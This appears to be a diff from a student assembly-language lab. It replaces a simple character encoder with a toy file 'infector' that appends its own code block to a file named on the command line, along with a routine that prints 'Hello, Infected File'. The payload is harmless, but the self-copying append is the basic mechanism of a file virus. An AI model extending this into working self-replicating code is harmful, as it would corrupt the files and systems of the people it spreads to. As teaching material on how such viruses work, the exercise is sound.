@@ -3,14 +3,19 @@ section .data
     char_buff dd 0
     infile dd 0
     outfile dd 1
+    infected_msg db 'Hello, Infected File', 0x0a
+    infected_msg_length equ $-infected_msg
 
 section .text
     global _start
     global system_call
-    global main
+    global infector
+    
 
 ; extern main
 extern strlen
+extern main
+
 _start:
     pop    dword ecx    ; ecx = argc
     mov    esi,esp      ; esi = argv
@@ -49,146 +54,57 @@ system_call:
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
 
-
-main:
-    push    ebp             ; Save caller state
-    mov     ebp, esp
-    sub     esp, 4          ; Leave space for local var on stack
-    pushad                  ; Save some more caller state
-
-    mov     ecx, [ebp+8]    ; i = argc
-
-argv_loop:
-    push    ecx
-    mov     eax, [ebp+12]   ; eax = argv
-    mov     ebx, [ebp+8]    ; ebx = argc
-    sub     ebx, ecx        ; ebx = i
-    shl     ebx, 2          ; ebx = i * 4
-    add     eax, ebx        ; eax = eax + i * 4
-    mov     ecx, [eax]      ; ecx = *(argv + i * 4)
-    push    ecx
-    call    check_inout_files_from_arg
-    call    strlen
-    pop     ecx
-
-    mov     edx, eax        ; edx = strlen(ecx)
-    mov     eax, 0x4        ; system call for write()
-    mov     ebx, 1          ; file descriptor for stdout
-    int 0x80
-    ; print new line
-    mov     eax, 0x4        ; system call for write()
-    mov     ebx, 1          ; file descriptor for stdout
-    mov     ecx, new_line
-    mov     edx, 1
-    int 0x80
-
-    pop ecx
-    loop    argv_loop
-    
-
-encode_loop:
-    ;; read char from stdin 
-    mov     eax, 0x3           ; system call for read()
-    mov     ebx, [infile]      ; file descriptor for stdin
-    mov     ecx, char_buff  
-    mov     edx, 1             ; number of bytes to read
-    int 0x80 
-    
-    ;; check if eax > 0
-    cmp    eax, 0
-    jle    end_encode_loop
-    push   dword [char_buff]
-    call   encode
-    mov [char_buff], eax
-    add     esp, 4
-
-    ;; write char to stdout
-    mov ecx, char_buff
-    mov eax, 0x4               ; system call for write()
-    mov ebx, [outfile]         ; file descriptor for out file 
-    mov edx, 1
-    int 0x80
-
-    ; print new line
-    mov     eax, 0x4           ; system call for write()
-    mov     ebx, [outfile]     ; file descriptor for out file
-    mov     ecx, new_line
-    mov     edx, 1
-    int 0x80
-    jmp    encode_loop
-
-end_encode_loop:
-    ;; Close input/output files
-    cmp dword [infile], 0
-    jne close_output_file
-    mov     eax, 0x6           ; system call for close()
-    mov     ebx, [infile]      ; file descriptor
-    int 0x80
-
-close_output_file:
-    cmp dword [outfile], 1
-    jne main_end
-    mov     eax, 0x6           ; system call for close()
-    mov     ebx, [outfile]     ; file descriptor
-    int 0x80
-
-main_end:
     popad                   ; Restore caller state (registers)
-    add     esp, 4          ; Restore caller state
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
 
-
-encode:
-    ;; fuck state of registers
-    mov eax , [esp + 4]       ; eax = char
-
-    ;; check if char is between 'a' and 'z'
-    cmp eax, 'A'
-    jl encode_return
-    ;;else
-    cmp eax, 'z'
-    jg encode_return
-    ;; encode char
-    add     eax, 1             ; encode char
-encode_return:
-    ret
-    
-
-
-check_inout_files_from_arg:
+code_start:
+    nop
+infection:
     push    ebp             ; Save caller state
     mov     ebp, esp
     pushad                  ; Save some more caller state
 
-    mov ebx, [ebp+8]
-    ;; Check for output file
-    cmp word [ebx], '-'+(256*'o')
-    jne check_input_file
-    add ebx, 2
-    mov eax, 5          ; open syscall
-    mov ecx, 0x241      ; O_WRONLY | O_CREAT | O_TRUNC
-    mov edx, 0644o      ; File permissions -rw-r--r--
-    int 0x80
-    sub ebx, 2
-    cmp eax, 0
-    jl check_input_file
-    mov [outfile], eax
+    ; write the message to stdout
+    mov eax, 0x4                            ; system call for write()
+    mov ebx, 1                           ; file descriptor for stdout
+    mov ecx, infected_msg                ; pointer to the message
+    mov edx, infected_msg_length         ; message length
+    int 0x80                        
 
-check_input_file:
-    ;; Check for input file
-    cmp word [ebx], '-'+(256*'i')
-    jne check_inout_files_from_arg_end
-    add ebx, 2
-    mov eax, 5          ; open syscall
-    mov ecx, 0x0        ; O_RDONLY
-    int 0x80
-    
-    cmp eax, 0
-    jl check_inout_files_from_arg_end
-    mov [infile], eax
-
-check_inout_files_from_arg_end:
     popad                   ; Restore caller state (registers)
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
+
+infector:
+    push    ebp             ; Save caller state
+    mov     ebp, esp
+    pushad                  ; Save some more caller state
+
+    ;;open the file from the argument
+    mov ebx, [ebp+8]        ;get the file name
+    mov eax, 5              ; open syscall
+    mov ecx, 02001o             ; O_WRONLY | O_APPEND
+    int 0x80
+
+    
+    ;;add excutable code to the end of the file
+    ; write the message to end of file
+    mov ebx, eax                       ; file descriptor for fd
+    mov eax, 0x4                       ; system call for write()
+    mov ecx, code_start                ; pointer to the message
+    mov edx, code_end                  ; message length
+    sub edx, code_start
+    int 0x80    
+
+    ;;close the file
+    mov     eax, 0x6           ; system call for close()
+    int 0x80
+
+
+    popad                   ; Restore caller state (registers)
+    pop     ebp             ; Restore caller state
+    ret                     ; Back to caller
+    nop
+code_end:
+    nop
